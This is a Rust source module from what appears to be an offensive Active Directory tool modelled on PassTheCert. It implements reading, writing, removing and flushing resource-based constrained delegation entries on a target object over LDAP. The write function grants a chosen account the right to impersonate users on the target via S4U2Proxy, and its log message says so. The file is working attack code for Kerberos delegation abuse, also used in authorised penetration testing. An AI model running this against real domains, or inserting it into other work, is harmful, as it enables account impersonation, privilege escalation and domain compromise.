//! RBCD (Resource-Based Constrained Delegation) actions.
//! Mirrors PassTheCert RBCD: read / write / remove / flush.
//! Operates on msDS-AllowedToActOnBehalfOfOtherIdentity.

use std::collections::HashSet;

use anyhow::{anyhow, Result};
use ldap3::{Ldap, Mod, Scope, SearchEntry};
use log::info;

use crate::args::Options;
use super::sd;

const RBCD_ATTR: &str = "msDS-AllowedToActOnBehalfOfOtherIdentity";

fn base_dn(domain: &str) -> String {
    domain.split('.').map(|p| format!("dc={p}")).collect::<Vec<_>>().join(",")
}

async fn find_object(ldap: &mut Ldap, base: &str, sam: &str)
    -> Result<(String, String)> // (dn, sid_str)
{
    let filter = format!("(sAMAccountName={})", ldap3::ldap_escape(sam));
    let (rs, _) = ldap.search(base, Scope::Subtree, &filter, vec!["objectSid"])
        .await?.success()?;
    let entry = rs.into_iter().next()
        .ok_or_else(|| anyhow!("object '{sam}' not found"))?;
    let se = SearchEntry::construct(entry);
    let sid_raw = se.bin_attrs.get("objectSid")
        .and_then(|v| v.first().cloned())
        .unwrap_or_default();
    Ok((se.dn, sd::sid_to_str(&sid_raw)))
}

async fn read_rbcd_raw(ldap: &mut Ldap, _base: &str, target_dn: &str)
    -> Result<(Vec<u8>, Vec<(Vec<u8>, u8)>)> // (raw_sd, entries)
{
    let (rs, _) = ldap.search(target_dn, Scope::Base, "(objectClass=*)", vec![RBCD_ATTR])
        .await?.success()?;
    let entry = rs.into_iter().next()
        .ok_or_else(|| anyhow!("could not read target object"))?;
    let se = SearchEntry::construct(entry);
    let raw = se.bin_attrs.get(RBCD_ATTR)
        .and_then(|v| v.first().cloned())
        .unwrap_or_default();
    let entries = if raw.is_empty() { vec![] } else { sd::parse_dacl_entries(&raw) };
    Ok((raw, entries))
}

/// Display accounts allowed to act on behalf of the target (read_rbcd).
pub async fn read(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref()
        .ok_or_else(|| anyhow!("--delegate-to required"))?;
    let base = base_dn(&opts.domain);
    let (target_dn, _) = find_object(ldap, &base, target).await?;
    let (_, entries) = read_rbcd_raw(ldap, &base, &target_dn).await?;
    if entries.is_empty() {
        info!("[*] {RBCD_ATTR} is empty for {target}");
    } else {
        info!("[*] accounts allowed to act on behalf of '{target}':");
        for (sid_b, _) in &entries {
            info!("    {}", sd::sid_to_str(sid_b));
        }
    }
    Ok(())
}

/// Write RBCD: add delegate-from to the target's msDS-AllowedToAct... attribute.
pub async fn write(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref()
        .ok_or_else(|| anyhow!("--delegate-to required"))?;
    let from = opts.delegate_from.as_deref()
        .ok_or_else(|| anyhow!("--delegate-from required"))?;
    let base = base_dn(&opts.domain);
    let (target_dn, _) = find_object(ldap, &base, target).await?;
    let (_, from_sid_str) = find_object(ldap, &base, from).await?;
    let from_sid = sd::sid_from_str(&from_sid_str)?;

    let (_, mut entries) = read_rbcd_raw(ldap, &base, &target_dn).await?;

    // Only add if not already present.
    let already = entries.iter().any(|(s, _)| sd::sid_to_str(s) == from_sid_str);
    if already {
        info!("[!] '{from}' can already act on behalf of '{target}' - not modifying");
        return Ok(());
    }
    entries.push((from_sid.clone(), 0x00));

    let aces: Vec<Vec<u8>> = entries.iter().map(|(s, _)| sd::allow_ace(s)).collect();
    let new_sd = sd::build_sd(&sd::admin_sid(), &aces);
    ldap.modify(&target_dn, vec![Mod::Replace(RBCD_ATTR.as_bytes().to_vec(), HashSet::from([new_sd]))])
        .await?.success()
        .map_err(|e| anyhow!("write_rbcd failed: {e}"))?;
    info!("[+] '{from}' can now impersonate users on '{target}' via S4U2Proxy");
    Ok(())
}

/// Remove RBCD: remove delegate-from from the target's SD.
pub async fn remove(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref()
        .ok_or_else(|| anyhow!("--delegate-to required"))?;
    let from = opts.delegate_from.as_deref()
        .ok_or_else(|| anyhow!("--delegate-from required"))?;
    let base = base_dn(&opts.domain);
    let (target_dn, _) = find_object(ldap, &base, target).await?;
    let (_, from_sid_str) = find_object(ldap, &base, from).await?;

    let (_, entries) = read_rbcd_raw(ldap, &base, &target_dn).await?;
    let filtered: Vec<_> = entries.into_iter()
        .filter(|(s, _)| sd::sid_to_str(s) != from_sid_str)
        .collect();

    let aces: Vec<Vec<u8>> = filtered.iter().map(|(s, _)| sd::allow_ace(s)).collect();
    let new_sd = sd::build_sd(&sd::admin_sid(), &aces);
    ldap.modify(&target_dn, vec![Mod::Replace(RBCD_ATTR.as_bytes().to_vec(), HashSet::from([new_sd]))])
        .await?.success()
        .map_err(|e| anyhow!("remove_rbcd failed: {e}"))?;
    info!("[+] RBCD entry for '{from}' removed from '{target}'");
    Ok(())
}

/// Flush RBCD: clear msDS-AllowedToActOnBehalfOfOtherIdentity entirely.
pub async fn flush(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref()
        .ok_or_else(|| anyhow!("--delegate-to required"))?;
    let base = base_dn(&opts.domain);
    let (target_dn, _) = find_object(ldap, &base, target).await?;
    ldap.modify(&target_dn, vec![Mod::Replace(RBCD_ATTR.as_bytes().to_vec(), HashSet::<Vec<u8>>::new())])
        .await?.success()
        .map_err(|e| anyhow!("flush_rbcd failed: {e}"))?;
    info!("[+] RBCD flushed for '{target}'");
    Ok(())
}